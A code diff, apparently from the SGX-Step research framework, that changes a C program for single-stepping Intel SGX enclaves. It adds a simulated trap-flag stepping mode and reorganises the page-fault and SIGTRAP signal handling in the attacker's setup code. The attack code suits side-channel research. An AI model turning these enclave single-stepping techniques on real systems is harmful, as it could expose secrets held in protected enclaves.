@@ -3,6 +3,7 @@
 #include <signal.h>
 #include <unistd.h>
 #include "libsgxstep/apic.h"
+#include "libsgxstep/cpu.h"
 #include "libsgxstep/pt.h"
 #include "libsgxstep/sched.h"
 #include "libsgxstep/enclave.h"
@@ -14,10 +15,23 @@
 #include <sys/mman.h>
 
 #define MAX_LEN            15
-#define DO_STEP            1
+#define DO_TIMER_STEP      1
 #define DEBUG              0
 #define DBG_ENCL           1
-#define ANIMATION_DELAY    50000000
+#if DO_TIMER_STEP
+    #define ANIMATION_DELAY    50000000
+#else
+    #define ANIMATION_DELAY    5000
+#endif
+
+/*
+ * NOTE: set DO_TIMER_STEP=0 to _simulate_ a single-stepping attack through the
+ * x86 hardware trap flag (RFLAGS.TF). Use for demonstration/debugging purposes
+ * only, as this does _not_ work for SGX debug enclaves(!)
+ */
+#if !DO_TIMER_STEP
+    #warning "Using simulated stepping through HW trap flag; will not work for production enclaves!"
+#endif
 
 sgx_enclave_id_t eid = 0;
 int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
@@ -29,6 +43,10 @@ void *code_adrs, *trigger_adrs;
 /* Called before resuming the enclave after an Asynchronous Enclave eXit. */
 void aep_cb_func(void)
 {
+    #if !DO_TIMER_STEP
+        DISABLE_TF;
+    #endif
+
     #if DEBUG
         uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
         info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*pte_encl));
@@ -69,44 +87,55 @@ void aep_cb_func(void)
      * enclave instruction.
      * 
      */
-#if DO_STEP
     if (do_irq)
     {
         *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
+#if DO_TIMER_STEP
         apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
-    }
+#else
+        ENABLE_TF;
 #endif
+    }
 }
 
 /* Called upon SIGSEGV caused by untrusted page tables. */
 void fault_handler(int signo, siginfo_t * si, void  *ctx)
 {
-    ASSERT(fault_cnt++ < 10);
-
     switch ( signo )
     {
       case SIGSEGV:
+        ASSERT(fault_cnt++ < 10);
+
         #if DEBUG
             info("Caught page fault (base address=%p)", si->si_addr);
         #endif
+    
+        if (si->si_addr == trigger_adrs)
+        {
+            #if DEBUG
+                info("Restoring trigger access rights..");
+            #endif
+            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
+            do_irq = 1;
+        }
+        else
+        {
+            info("Unknown #PF address!");
+        }
+    
         break;
+
+    #if !DO_TIMER_STEP
+      case SIGTRAP:
+        #if DEBUG
+            //info("Caught single-step trap (RIP=%p)\n", si->si_addr);
+        #endif
+        break;
+    #endif
 
       default:
         info("Caught unknown signal '%d'", signo);
         abort();
-    }
-
-    if (si->si_addr == trigger_adrs)
-    {
-        #if DEBUG
-            info("Restoring trigger access rights..");
-        #endif
-        ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
-        do_irq = 1;
-    }
-    else
-    {
-        info("Unknown #PF address!");
     }
 
     // NOTE: return eventually continues at aep_cb_func and initiates
@@ -115,17 +144,9 @@ void fault_handler(int signo, siginfo_t * si, void  *ctx)
 
 /* ================== ATTACKER INIT/SETUP ================= */
 
-/* Configure and check attacker untrusted runtime environment. */
-void attacker_config_runtime(void)
+void register_signal_handler(int signo)
 {
     struct sigaction act, old_act;
-
-    ASSERT( !claim_cpu(VICTIM_CPU) );
-    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
-    //print_system_settings();
-
-    register_enclave_info();
-    print_enclave_info();
 
     /* Specify #PF handler with signinfo arguments */
     memset(&act, sizeof(sigaction), 0);
@@ -134,7 +155,19 @@ void attacker_config_runtime(void)
 
     /* Block all signals while the signal is being handled */
     sigfillset(&act.sa_mask);
-    ASSERT(!sigaction( SIGSEGV, &act, &old_act ));
+    ASSERT(!sigaction( signo, &act, &old_act ));
+}
+
+/* Configure and check attacker untrusted runtime environment. */
+void attacker_config_runtime(void)
+{
+    ASSERT( !claim_cpu(VICTIM_CPU) );
+    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
+    //print_system_settings();
+
+    register_enclave_info();
+    print_enclave_info();
+    register_signal_handler( SIGSEGV );
 }
 
 /* Provoke page fault on enclave entry to initiate single-stepping mode. */
@@ -184,11 +217,14 @@ int main( int argc, char **argv )
     attacker_config_page_table();
     register_aep_cb(aep_cb_func);
 
-#if DO_STEP
+#if DO_TIMER_STEP
     info_event("Establishing user-space APIC/IDT mappings");
     map_idt(&idt);
     install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
     apic_timer_oneshot(IRQ_VECTOR);
+#else
+    register_signal_handler( SIGTRAP );
+    set_debug_optin();
 #endif
 
     /* 2. Single-step enclaved execution. */
